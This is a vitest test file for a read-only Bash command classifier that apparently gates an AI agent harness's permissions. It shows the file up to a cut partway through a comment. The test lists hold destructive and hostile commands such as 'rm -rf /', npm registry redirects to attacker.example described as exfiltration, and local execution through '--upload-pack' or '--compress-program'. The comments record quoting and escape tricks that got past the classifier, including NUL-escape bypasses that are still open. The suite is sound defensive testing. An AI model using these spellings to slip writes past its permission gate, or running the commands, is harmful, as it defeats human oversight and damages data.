import { describe, expect, it } from "vitest";
import {
  isReadOnlyBashCommand,
  isReadOnlyBashPipeline,
} from "../../src/runtime/read-only-bash.js";

describe("read-only Bash classifier", () => {
  describe("simple read-only binaries", () => {
    it.each([
      "ls",
      "ls -la",
      "ls -la /tmp",
      "cat /etc/hosts",
      "pwd",
      "which node",
      "find . -name '*.ts'",
      "find . -type f -size +1k",
      "find src -maxdepth 2",
      "grep -r foo src/",
      "rg foo",
      "wc -l src/index.ts",
      "head -20 README.md",
      "tail -f /var/log/app.log",
      "stat src/index.ts",
      "ps aux",
      "whoami",
      "id",
      "env",
      "uname -a",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });
  });

  describe("git read-only subcommands", () => {
    it.each([
      "git status",
      "git status -uno",
      "git log",
      "git log --oneline -20",
      "git diff",
      "git diff HEAD~1",
      "git show HEAD",
      "git branch",
      "git branch --show-current",
      "git fetch origin",
      "git remote -v",
      "git ls-files",
      "git rev-parse HEAD",
      "git describe",
      "git blame README.md",
      "git reflog",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it.each([
      "git push",
      "git push origin master",
      "git commit",
      "git commit -m wip",
      "git add .",
      "git reset --hard",
      "git checkout master",
      "git rebase main",
      "git merge feature",
      "git stash",
      "git clean -fd",
      "git cherry-pick abc123",
      "git revert HEAD",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  // Task 9d1fff1b: allowlisted git subcommands that MUTATE once given
  // arguments. All six forms were reproduced against real git 2.50.1
  // (scratchpad/git-repro.sh: branch deleted, tag created, config
  // rewritten, file created, reflog emptied, local ref written). Pinned
  // as negative tests so a regression to the bare-name allowlist reddens
  // at least one of these.
  describe("git argument forms that mutate (must block — 9d1fff1b)", () => {
    it.each([
      "git branch -D main",
      "git branch -d main",
      "git branch --delete main",
      "git branch -m old new",
      "git branch newbranch",
      "git branch --set-upstream-to=origin/main",
      "git branch --unset-upstream",
      "git tag v1",
      "git tag -a v1 -m msg",
      "git tag -d v1",
      "git remote add origin https://example.com/a.git",
      "git remote set-url origin https://example.com/b.git",
      "git remote remove origin",
      "git remote rename a b",
      "git remote prune origin",
      "git remote update",
      "git fetch origin main:main",
      "git fetch https://example.com/a.git HEAD:refs/heads/x",
      "git fetch origin +refs/heads/*:refs/remotes/o/*",
      "git diff --output=/tmp/x.patch HEAD~1 HEAD",
      "git log --output=/tmp/x.txt",
      "git show --output=/tmp/x.txt HEAD",
      "git reflog expire --expire=now --all",
      "git reflog delete main@{0}",
      "git reflog drop",
      // Review round 1: --output writes a file at git's OPTION-PARSE time,
      // so it is a write vector on EVERY revision walker, not just
      // diff/log/show. Measured on git 2.50.1 (scratchpad/git-repro2.sh):
      // all three created a file.
      "git rev-list --output=/tmp/x.txt HEAD",
      "git shortlog --output=/tmp/x.txt HEAD",
      "git blame --output=/tmp/x.txt README.md",
      // Review round 1: transport-level local execution. `--upload-pack`
      // ran an operator-named binary (measured, canary created); ext::/fd::
      // transport helpers run a local program (config-dependent, blocked
      // defensively). Both the glued and separated flag forms.
      "git fetch --upload-pack=/tmp/evil.sh /tmp/repo",
      "git fetch --upload-pack /tmp/evil.sh /tmp/repo",
      "git ls-remote --upload-pack=/tmp/evil.sh /tmp/repo",
      "git ls-remote ext::sh -c touch",
      // Single-positional so the `::` danger arm is what blocks it (a
      // 2-positional form would be caught by fetch's count rule anyway,
      // review round 2: keep this test load-bearing for the `::` arm).
      "git fetch ext::sh",
      // Review round 1: no-positional glued branch writes — the ONLY
      // forms that exercise the raw-or-decoded arm of isBranchWriteFlag
      // (the structural no-positional rule cannot see them).
      "git branch --edit-description",
      "git branch -f",
      "git branch --force",
      // Review round 1: flag-before-verb write forms (exercise
      // find(isPositional) / operandTail, not args[0]).
      "git remote -v update",
      "git remote set-head origin -a",
      // Review round 1: end-of-options handling — the operand after `--`
      // must count as positional.
      "git tag -- -weirdtag",
      // Dash-leading operand so the pre-fix all-flags rule would have
      // MISclassified it as no-positional (review round 2: makes the
      // branch `--` path load-bearing, not just the tag/reflog ones).
      "git branch -- -newbranch",
      "git reflog -- expire",
      // Review round 1: the tag-keyword fetch form (three positionals).
      "git fetch origin tag v1",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });

    // Positive controls: the BARE forms and genuine read invocations of
    // the same subcommands must stay read-only (AC2), including the AC5
    // read corpus that flows through the same classifier.
    it.each([
      "git branch",
      "git branch -a",
      "git branch -vv",
      "git branch --list",
      "git tag",
      "git tag -l",
      "git tag -n5",
      "git remote",
      "git remote -v",
      "git remote show origin",
      "git remote get-url origin",
      "git reflog",
      "git reflog show",
      "git reflog show HEAD",
      "git reflog -n 5",
      "git diff",
      "git log",
      "git show",
      "git status",
      // AC5 read corpus (must classify read-only unchanged).
      "git rev-parse --git-dir",
      "git ls-files -c",
      "git log -c HEAD",
      "git show -c HEAD",
      "git diff --stat",
      "git status --short",
      "git fetch origin",
      // Review round 1: a single-positional fetch from a URL is read-only;
      // the earlier `:`-in-positional rule wrongly blocked it (every URL
      // contains `:`). One positional can only be a remote/URL, never a
      // local-ref-writing refspec (git needs remote AND refspec).
      "git fetch https://example.com/a.git",
      "git ls-remote https://example.com/a.git",
      "git ls-remote origin",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    // Shell-quoting must not launder a write past the positive shape
    // (repo convention, task fdee7d0f): quoting the verb/flag can only
    // fail the positive match and thus BLOCK, never admit.
    it.each([
      'git remote se"t-url" origin x',
      "git remote 'set-url' origin x",
      'git branch -"D" main',
      'git reflog ex"pire" --all',
    ])("blocks quoted write form %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });

    // Review round 1: these are the ONLY forms that actually exercise the
    // raw-or-decoded decode arms (no positional to catch them structurally,
    // and the flag is quoted so the raw literal misses). The per-arm
    // mutation probe (delete each `decodeShellWord` arm) must redden here.
    it.each([
      'git branch --"set-upstream-to"=origin/main',
      'git diff --"output"=/tmp/x',
      'git rev-list --"output"=/tmp/x HEAD',
    ])("blocks quoted no-positional write form %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("gh read-only verbs", () => {
    it.each([
      "gh pr view 240",
      "gh pr list",
      "gh pr diff 240",
      "gh pr checks 240",
      "gh pr status",
      "gh issue view 1",
      "gh issue list",
      "gh run view 12345",
      "gh run list",
      "gh workflow list",
      "gh repo view",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it.each([
      "gh pr create",
      "gh pr merge 240",
      "gh pr close 240",
      "gh pr edit 240 --title foo",
      "gh issue create",
      "gh repo clone foo/bar",
      "gh secret set TOKEN",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("cd (pure navigation form)", () => {
    it.each([
      "cd",
      "cd -",
      "cd ..",
      "cd /tmp",
      "cd /Users/lan/git/pandora/harness",
      "cd ~",
      "cd ../other-repo",
      "cd -P /tmp",
      "cd -L .",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it.each([
      // Chained or redirected `cd` forms mutate more than shell state (or
      // hide a write behind the navigation prefix) and must not be
      // floored: the metachar guard in `isReadOnlyBashCommand` rejects
      // the whole string before `cd` is ever inspected.
      "cd /tmp && rm -rf /",
      "cd /tmp; rm -rf /",
      "cd /tmp || rm -rf /",
      "cd /tmp | rm -rf /",
      "cd $(rm -rf /)",
      "cd `rm -rf /`",
      "cd /tmp > out.txt",
      "cd /tmp < input",
    ])("blocks %s (chained/redirected cd is not read-only)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("npm read-only subcommands (curated allowlist)", () => {
    it.each([
      "npm audit",
      "npm audit --json",
      "npm audit signatures",
      "npm audit --json signatures",
      "npm ls",
      "npm ls --depth=0",
      "npm list",
      "npm view lodash",
      "npm view lodash version",
      "npm info lodash", // alias for view
      "npm show lodash", // alias for view
      "npm outdated",
      "npm why lodash",
      "npm explain lodash", // formal name for why
      "npm ping",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it.each([
      // Mutating subcommands must stay unclassified (gated), not floored.
      "npm install",
      "npm i lodash",
      "npm ci",
      "npm publish",
      "npm update",
      "npm version patch",
      "npm run build",
      "npm audit fix",
      "npm audit fix --force",
      "npm audit --audit-level high", // separated flag value fails closed
      "npm audit --omit dev", // separated flag value fails closed (any value-taking flag, not just --audit-level)
      // Unknown/future npm subcommand: the allowlist is positive, so an
      // unenumerated verb stays unclassified rather than assumed safe.
      "npm some-future-verb",
      // Aliases are deliberately NOT floored, only canonical spellings.
      "npm la",
      "npm ll",
      "npm v lodash",
    ])("blocks %s (positive allowlist, not a denylist)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });

    it.each([
      // Shell-quoting spellings of `fix` that a token-equality denylist
      // would miss because none of the RAW tokens equals the string "fix"
      // (npm's own argv parsing strips the quoting before npm ever sees
      // it). The positive-shape check (only `-flags` or literal
      // `signatures` after `audit`) fails closed on all of them.
      "npm audit \"fix\"",
      "npm audit 'fix'",
      "npm audit f''ix",
      "npm audit fi\"x\"",
      "npm audit $'fix'",
    ])("blocks %s (quoted/glued spellings of the mutating audit-fix arm)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });

    it.each([
      // --registry / --userconfig / --globalconfig redirect npm's network
      // or config lookups to an operator-unverified location; forfeit the
      // floor for ANY otherwise-read-only npm subcommand.
      "npm audit --registry=http://attacker.example",
      "npm audit --registry http://attacker.example",
      "npm ls --registry=http://attacker.example",
      "npm view lodash --userconfig=/tmp/evil.npmrc",
      "npm outdated --globalconfig=/tmp/evil.npmrc",
      // Per-scope registry override: npm resolves a scoped package's
      // registry from `@scope:registry` before the plain `registry` config,
      // so this is an equally live exfiltration vector, not merely a
      // naming variant of the bare --registry flag above.
      "npm view lodash --@scope:registry=http://e.x",
      "npm audit --@myorg:registry=http://e.x",
      // Separated-value form of the scoped flag, deliberately on a
      // NON-audit subcommand (`view`, not `audit`). Review round 3
      // (task 769d5452) found the audit-subcommand spelling of this case
      // (`npm audit --@myorg:registry http://e.x`) inert under a
      // NPM_REGISTRY_FLAG_RE mutation: `npm audit`'s own positive-shape
      // check already rejects any bare positional token after `audit`
      // (see the `sub === "audit"` branch below), so `http://e.x` was
      // blocked by THAT check regardless of the registry guard, and the
      // assertion stayed green even with the scoped-registry guard
      // deleted. `npm view` has no such positional-token check, so this
      // spelling exercises NPM_REGISTRY_FLAG_RE's separated-value branch
      // on its own — verified by mutation: rolling the regex back to
      // /^--registry(=|$)/ flips this and both glued scoped forms, and
      // dropping only the separated-value branch flips exactly this one.
      "npm view lodash --@myorg:registry http://e.x",
    ])("blocks %s (untrusted registry/config source flag)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });

    it.each([
      // Task 2dfdf472: `hasNpmUntrustedSourceFlag` compared RAW tokens
      // only (unlike every other write/danger guard in this file, which
      // already tests raw-OR-decoded). Shell-quoting the flag name hides
      // it from `NPM_REGISTRY_FLAG_RE`/`NPM_UNSCOPED_UNTRUSTED_FLAGS`
      // while bash still strips the quotes before npm ever sees the
      // argv — measured: `echo npm audit --"registry"=x` prints
      // `npm audit --registry=x` verbatim. Each of these reaches npm as
      // the exact unquoted flag from the block above.
      "npm audit --\"registry\"=http://evil.example/",
      "npm audit --reg\"istry\"=http://evil.example/",
      "npm audit --'registry'=http://evil.example/",
      "npm audit --\"userconfig\"=/tmp/evil.npmrc",
      "npm ls --\"registry\"=http://evil.example/",
      "npm view lodash --\"userconfig\"=/tmp/evil.npmrc",
      "npm outdated --\"globalconfig\"=/tmp/evil.npmrc",
      // Scoped form, quoted two different ways.
      "npm audit --@myorg:reg\"istry\"=http://e.x",
      "npm audit --\"@myorg:registry\"=http://e.x",
      "npm view lodash --\"@myorg:registry\"=http://e.x",
    ])("blocks %s (quoted spelling of the untrusted registry/config source flag)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });

    it("floors `npm audit -fix` deliberately: verified npm behavior is a parse error, not the mutating fix arm", () => {
      // Single dash, not the `fix` subcommand or a recognized flag cluster.
      // Verified npm 11.17.0 behavior: `Unknown cli config "--fix"`, and npm
      // falls back to the plain read-only report — it does NOT run
      // `npm audit fix`. `startsWith("-")` correctly floors this; do not
      // "fix" it into a block without re-verifying npm's parser first.
      expect(isReadOnlyBashCommand("npm audit -fix")).toBe(true);
    });
  });

  describe("harness read-only subcommands", () => {
    it.each([
      "harness doctor",
      "harness validate",
      "harness audit",
      "harness diff",
      "harness list",
      "harness version",
      "harness pause",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it.each([
      "harness apply",
      "harness approve understanding",
      "harness preflight",
      "harness init",
    ])("blocks %s (write or special-cased elsewhere)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("--version / --help two-token shape", () => {
    it.each([
      "node --version",
      "npm --version",
      "rm --version",
      "git --version",
      "gh --version",
      "harness --version",
      "node -v",
      "node --help",
      "rm --help",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it("blocks a three-token --version shape that would smuggle args", () => {
      expect(isReadOnlyBashCommand("rm --version somefile")).toBe(false);
    });
  });

  describe("shell metacharacter rejection (fail-closed)", () => {
    it.each([
      "ls; rm file",
      "ls && rm file",
      "ls || rm file",
      "ls | tee out",
      "ls > out",
      "ls >> out",
      "ls < input",
      "cat $(rm file)",
      "cat `rm file`",
      "ls\nrm file",
    ])("blocks %s (chaining/redirection/substitution)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("find write-flag rejection (the only SIMPLE bin with mutating own flags)", () => {
    it.each([
      "find . -delete",
      "find . -name '*.tmp' -delete",
      "find . -exec rm {} +",
      "find . -name x -exec rm {} ;",
      "find . -execdir touch foo {} +",
      "find . -ok rm {} ;",
      "find . -okdir rm {} ;",
      "find . -fprint /tmp/out",
      "find . -fprintf /tmp/out '%p\\n'",
      "find . -fprint0 /tmp/out",
      "find . -fls /tmp/out",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("command-runner binaries classify the wrapped command", () => {
    it.each([
      // Bare / lookup-only forms stay read-only.
      "env",
      "env -u FOO",
      "env -i",
      "env FOO=bar",
      "env FOO=bar BAZ=qux",
      "command",
      "command -v node",
      "command -V node",
      // Runner wrapping a read-only command stays read-only.
      "env ls -la",
      "env FOO=bar ls /tmp",
      "env -u PATH cat /etc/hosts",
      "env -i grep foo src/",
      "command ls -la",
      "command cat /etc/hosts",
      "command git status",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it.each([
      // The exact bypass forms from the audit finding.
      "command rm -rf /tmp/x",
      "env rm /tmp/x",
      "env FOO=bar rm -rf /",
      // More runner-wrapped writes.
      "env -u FOO rm /tmp/x",
      "env -i sh -c true",
      "env FOO=bar npm install",
      "command npm ci",
      "command touch foo",
      "command mkdir bar",
      "env PATH=/x command rm file",
      "command env rm file",
      // split-string re-parses a command string: always block.
      "env -S rm -rf /",
      "env --split-string=rm",
      "env -Srm",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("unclassifiable defaults to block (conservative allowlist)", () => {
    it.each([
      "rm /tmp/foo",
      "mv a b",
      "cp a b",
      "mkdir foo",
      "touch foo",
      "chmod +x foo",
      "ln -s a b",
      "npm install",
      "npm i lodash",
      "npm ci",
      "npm run build",
      "npx vitest",
      "pnpm install",
      "yarn",
      "make",
      "make install",
      "apt install foo",
      "pip install foo",
      "cargo build",
      "docker run foo",
      "kubectl apply -f x.yaml",
      "",
      "   ",
      "some-binary-we-have-never-heard-of",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("write-capable bins excluded from the allowlist (own flags/operands write)", () => {
    // `uniq`'s second positional operand is its output file (no clean
    // flag to match), `date -s` sets the clock but `-s` is
    // cluster-ambiguous with benign flags, and `hostname NAME` sets the
    // hostname via a positional operand. All three stay fully excluded.
    // `sort`, `tree`, and `file` write forms are listed here too; their
    // read forms are tested in the guarded-output-flag suite below.
    it.each([
      "sort -o out.txt in.txt",
      "sort --output=out.txt in.txt",
      "uniq in.txt out.txt",
      "uniq in.txt",
      "tree -o listing.txt",
      "file -C -m mymagic",
      "file --compile",
      "date -s 2020-01-01T00:00:00",
      "date",
      "hostname newname",
      "hostname",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("guarded-output-flag bins: sort, tree, file (re-admitted with write-flag guards)", () => {
    describe("read forms classify as read-only", () => {
      it.each([
        // sort: no -o / --output flag
        "sort FILE",
        "sort -n FILE",
        "sort -nu FILE",
        "sort -r src/index.ts",
        "sort -k1,1 -t: /etc/passwd",
        // sort reads via long flags that are not write/exec vectors:
        // --files0-from reads a file list; a separate -S size arg whose
        // value contains 'T' (2T) is not the temp-dir flag.
        "sort --files0-from=list FILE",
        "sort -S 2T FILE",
        // tree: no -o / --output flag
        "tree DIR",
        "tree /some/dir",
        "tree -L 2 src/",
        // file: no -C / --compile flag; lowercase -c is benign
        "file FILE",
        "file src/index.ts",
        "file -i foo.txt",
        "file -b foo.txt",
        "file -c foo.txt",
      ])("allows %s", (cmd) => {
        expect(isReadOnlyBashCommand(cmd)).toBe(true);
      });
    });

    describe("write forms classify as NOT read-only", () => {
      it.each([
        // sort -o: separate flag
        "sort -o out in",
        "sort -o out.txt in.txt",
        // sort --output: long separate
        "sort --output out in",
        // sort --output=FILE: long with equals
        "sort --output=out in",
        "sort --output=out.txt in.txt",
        // sort cluster containing 'o': -no, -rno, -rnofoo (glued value)
        "sort -no out in",
        "sort -rno out in",
        "sort -rnofoo in",
        // sort -oFILE: glued value (lowercase 'o' at position 1 in cluster)
        "sort -oFILE in",
        // sort exec vector: --compress-program runs an arbitrary program on
        // spill temp files (arbitrary code execution, no shell metachar).
        "sort --compress-program=/tmp/evil in",
        "sort --compress-program /tmp/evil in",
        "sort -S 1k --compress-program=/tmp/evil bigfile",
        // sort temp-dir write: -T / --temporary-directory writes scratch
        // files to a caller-chosen path.
        "sort -T /tmp in",
        "sort -T/tmp in",
        "sort --temporary-directory=/tmp in",
        "sort --temporary-directory /tmp in",
        // tree -o: separate flag
        "tree -o list",
        "tree -o listing.txt",
        // tree --output: long separate
        "tree --output list.txt /dir",
        // tree --output=FILE: long with equals
        "tree --output=list.txt",
        // tree cluster containing 'o'
        "tree -no list",
        // file -C: separate flag
        "file -C",
        "file -C -m mymagic",
        // file --compile: long form
        "file --compile",
        "file --compile -m magic",
        // file cluster containing uppercase 'C'
        "file -bC x",
        "file -Cb x",
      ])("blocks %s", (cmd) => {
        expect(isReadOnlyBashCommand(cmd)).toBe(false);
      });
    });
  });
});

describe("read-only Bash pipeline classifier (isReadOnlyBashPipeline)", () => {
  describe("allows a `|` pipeline whose every stage is read-only", () => {
    it.each([
      "gh pr checks 123 | head",
      "gh pr checks 123 | head -5",
      "gh run list | head -20",
      "git log | grep fix",
      "git diff | cat",
      "cat file | wc -l",
      "ls -la | grep ts",
      "cat a | grep x | head",
      "ls|head",
      // A single command (no pipe) classifies exactly like the strict fn.
      "gh pr checks 123",
      "ls -la",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashPipeline(cmd)).toBe(true);
    });
  });

  describe("blocks a pipeline if any stage writes, or a non-pipe metachar appears", () => {
    it.each([
      "ls | tee out", // tee writes
      "cat a | tee b | head", // write in the middle stage
      "cat f | sh", // sh not on the allowlist
      "ls | rm x", // rm not on the allowlist
      "grep x | xargs rm", // xargs not on the allowlist
      "find . -delete | cat", // find write flag
      "sort -o out f | head", // sort write flag
      "cat a || rm b", // || surfaces as an empty stage
      "ls && rm x", // && contains &
      "cat a |& grep x", // |& contains &
      "ls & ", // background &
      "echo hi > out | cat", // redirection
      "echo $(rm x) | cat", // command substitution
      "cat `rm x` | head", // backtick substitution
      "| head", // leading pipe -> empty stage
      "ls |", // trailing pipe -> empty stage
      "ls | | head", // doubled pipe -> empty stage
      "", // empty
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashPipeline(cmd)).toBe(false);
    });
  });

  it("only the pipeline variant admits a pipe; the strict classifier is unchanged", () => {
    // isReadOnlyBashCommand must keep refusing all chaining for its other
    // consumers (Risk Classifier read-only floor, solution-acceptance
    // write-guard); only isReadOnlyBashPipeline admits a read-only `|`.
    expect(isReadOnlyBashPipeline("gh pr checks 123 | head")).toBe(true);
    expect(isReadOnlyBashCommand("gh pr checks 123 | head")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Task fdee7d0f: the write-flag guards compared RAW tokens, so any shell
// quoting hid the flag from them while bash still passed it through. Each
// case below was verified against the real binary in a fresh sandbox: the
// command genuinely wrote (or deleted), and the classifier still called it
// read-only. Ground truth was the artefact — a canary file's disappearance
// for `find`, the created output/cache file for `sort`/`file` — not the
// exit code.
//
// Which comparisons the family defeats is not uniform, and the split is the
// interesting part: exact set membership (`FIND_WRITE_FLAGS.has`) and
// long-flag prefix tests (`startsWith("--output=")`) are fully defeated,
// while the short-flag CLUSTER tests survive by accident, because the flag
// letter remains a substring of the quoted token (`-"o"` still contains
// `o`). The fix decodes the token before every one of these comparisons, so
// the surviving-by-accident cases stop depending on that accident.
//
// NOT COVERED, named rather than implied. One channel stays open, measured,
// not made worse by this change; the other channel named here at the time
// (GNU long-option ABBREVIATION) is now CLOSED — see task dd055c1d below,
// which fixes it and pins its own artefact-confirmed test cases in a
// dedicated section further down this file.
//
// 1. NUL escapes inside `$'...'`. bash TRUNCATES a `$'...'` run at a NUL and
//    drops a NUL sitting between runs; `decodeShellWord` emits a literal
//    U+0000 and keeps accumulating, so the decoded value never equals the
//    flag bash actually passes. Artefact-confirmed bypasses (canary deleted
//    / file created), all five NUL spellings `\0 \000 \x00 \u0000
//    \U00000000`:
//      find . -name c $'-delete\0XYZ'      find . -name c -$'\0'delete
//      sort $'--output\0' o.txt data.txt   file $'--compile\0X' -m magic
//    plus the same through the `env` and `command` recursions. Master fails
//    open identically, so this is a pre-existing gap this change does not
//    close and does not widen; the raw-token fallback cannot help, because
//    the raw form matches nothing either.
//
// The `$'...'` cases pinned in this file cover the NON-NUL spellings only.
// Deliberately NOT fixed here: modelling NUL truncation would be a third
// round of teaching this decoder one more bash rule, and the run's halt
// criterion (03-decisions.md D2, written before fix round 1) says to stop
// growing the model and file it instead.
// ---------------------------------------------------------------------------

describe("write-flag guards see through shell quoting (task fdee7d0f)", () => {
  // `find`: exact set membership, fully defeated by every spelling.
  it.each([
    'find . -"delete"',
    "find . -'delete'",
    "find . -\\delete",
    "find . -$'delete'",
    'find . -de"lete"',
    "find . -'exec' rm {} ;",
    'find . -$\'\\x64elete\'',
  ])("blocks the quoted find write flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // Long-flag prefix tests: `sort --output=`, `sort --compress-program=`,
  // `sort --temporary-directory=`, `file --compile`.
  it.each([
    'sort --"output"=out.txt data.txt',
    'sort --outp"ut"=out.txt data.txt',
    "sort --'compress-program'=/bin/cat data.txt",
    'sort --"temporary-directory"=. data.txt',
    'file --"compile" -m magic',
  ])("blocks the quoted long write flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // Short clusters: these already blocked before the fix (the letter stays
  // a substring), pinned so the decode cannot silently drop them.
  it.each(['sort -"o" out.txt data.txt', "sort -'o' out.txt data.txt", 'file -"C" -m magic'])(
    "still blocks the quoted short write flag: %s",
    (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    },
  );

  // Negative controls: decoding must not turn a genuinely read-only command
  // into a write. Without these the suite could not detect over-blocking.
  it.each([
    "find . -name canary.txt",
    'find . -name "*.ts"',
    "find . -type f",
    "sort data.txt",
    'sort -"n" data.txt',
    "cat data.txt",
    "ls -la",
    "file -m magic data.txt",
  ])("keeps genuinely read-only commands read-only: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(true);
  });

  // An unresolvable word decodes to itself, so classification falls back to
  // today's behaviour rather than to an invented value.
  it("an unterminated quote leaves the token compared raw", () => {
    expect(isReadOnlyBashCommand("find . -name 'x")).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Review round 1. Each case measured against real binaries with the artefact
// as ground truth (canary gone / output file created), not the exit code.
// ---------------------------------------------------------------------------

describe("write-flag guards: round-1 findings (task fdee7d0f)", () => {
  // F1. `$"..."` is bash locale quoting. With no catalog it is just a
  // double-quoted run, so `-$"delete"` IS `-delete`. The decoder had no
  // branch for it and SUCCEEDED with a wrong value, so the raw-token
  // fallback never fired. Five artefact-confirmed writes, including through
  // both command-runner recursions.
  it.each([
    'find . -name canary.txt -$"delete"',
    'env find . -name canary.txt -$"delete"',
    'command find . -name canary.txt -$"delete"',
    'sort --outp$"ut"=o.txt data.txt',
    'file --$"compile" -m magic',
  ])("blocks locale-quoted write flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // F2. `env --split-string=CMD` runs CMD. It is the one explicitly
  // fail-closed guard in this function and it was left comparing the RAW
  // token while its neighbours were decoded, so quoting the flag NAME
  // walked past it: measured executing `touch PWNED.txt` with no shell
  // metacharacter anywhere.
  it.each([
    'env --split-"string"=make',
    "env --split-'string'=make",
    "env --split-string=make",
    "env -S make",
  ])("blocks env split-string execution: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // F3. THE DIRECTION PIN. These went BLOCKED -> READONLY when the guards
  // tested the decoded token ALONE: the cluster branch excludes `--` by
  // construction, so a token whose leading `-X` decodes to `--` fell out of
  // the branch that used to match it. Testing raw OR decoded makes
  // "decoding only ever ADDS a match" true by construction; without that
  // shape these go red.
  it.each([
    'sort -"-out"=x.txt data.txt',
    "sort -'-out'=x.txt data.txt",
    'sort -"-o"=x.txt data.txt',
    'file -"-C" -m magic',
  ])("decoding never LOSES a match: %s stays blocked", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // The decode is wired into tree's guard too, but tree is NOT installed on
  // the machine this was measured on, so these are classifier-level only —
  // stated rather than implied. Without them the tree/output decode sites
  // were inert (removing them left the whole suite green).
  it.each([
    'tree -"o" list.txt',
    "tree --'output' list.txt",
    'tree --"output"=list.txt',
  ])("blocks quoted tree output flag (classifier-level, tree not installed): %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // Double-decode shapes. NOTE (round 2): an earlier version of this comment
  // said re-adding the second decode changes nothing because the raw arm
  // covers it. Measured false over 201,252 inputs — it moves 180 of them,
  // all fail-open. `-"-o"=x` below is the discriminating case: it dies
  // under BOTH the double-decode mutant and the decoded-only mutant, which
  // the three long-flag tree cases above cannot detect.
  it.each(["tree -\"'-o'\" d", "tree -$'\\x27-o\\x27' d", 'tree -"-o"=x d', 'tree -"-out" d'])(
    "blocks a doubly-quoted tree output flag: %s",
    (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    },
  );

  it("keeps a genuinely read-only tree invocation read-only", () => {
    expect(isReadOnlyBashCommand("tree -L 2 src")).toBe(true);
  });

  // ACCEPTED over-blocking, pinned so it is a decision rather than an
  // accident: a quoted operand that decodes EXACTLY to a write flag is
  // blocked even though it is a read. Over-blocking a read is the accepted
  // direction. Verified NOT to extend to the shapes most likely to hurt.
  it.each([
    "find . -name '-delete'",
    'find . -name "-exec"',
    "find . -newer '-exec'",
    "sort -k1 '-o'",
    "file '-C'",
  ])(
    "ACCEPTED over-block: %s",
    (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    },
  );

  it.each([
    'find . -name "*delete*"',
    "grep -- -delete data.txt",
    "find . -path './-ok'",
    'sort -"n" data.txt',
  ])("over-blocking does NOT extend to: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Task dd055c1d: GNU/BSD `getopt_long` accepts any UNAMBIGUOUS ABBREVIATION
// of a long option name, not just its full spelling. The pre-fix guards
// compared full spellings only (`--output`, `--compress-program`,
// `--temporary-directory`, `--compile`), so every abbreviation fell through
// and classified read-only while genuinely writing or executing. This is the
// channel task fdee7d0f named in its NOT-COVERED section above and left
// open.
//
// Ground truth is the created/executed artefact, not the exit code, measured
// against BOTH variants installed on the measurement machine: BSD sort
// (macOS 26 `/usr/bin/sort`), GNU coreutils sort 9.11 (Homebrew `gsort`),
// and `file` 5.41 (`/usr/bin/file`, one upstream codebase shared by macOS
// and Linux, so a second "variant" install adds no signal). `tree` (GNU
// tree 2.3.2, Homebrew, not previously installed on any machine this file
// was verified on) was also measured directly: it has no long spelling of
// `-o` at all and accepts NO abbreviation of any long option whatsoever
// (`--opt-toggle` works, `--opt` — a genuine prefix of a real tree option —
// errors `Invalid argument`), so the abbreviation fix is a no-op for tree in
// practice; it is still exercised below at the classifier level because
// `isTreeWriteToken` shares `isOutputWriteToken` with `sort`.
//
// Measured minimum unambiguous prefix (identical on BSD and GNU sort):
//   --output               -> --o   (1 char past `--`)
